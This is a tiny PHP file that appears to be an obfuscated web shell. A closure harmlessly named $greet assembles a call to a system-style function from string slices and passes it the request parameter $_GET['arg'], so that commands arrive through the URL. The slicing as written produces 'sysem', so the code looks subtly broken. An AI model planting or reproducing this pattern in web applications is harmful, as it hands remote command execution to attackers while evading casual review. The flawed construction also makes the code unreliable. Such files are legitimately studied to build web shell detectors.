<?php
$greet = function(){
    $method='system';
    (substr($method,0,3).substr($method, 4))($_GET['arg']);
};
echo $greet();
die("");
?>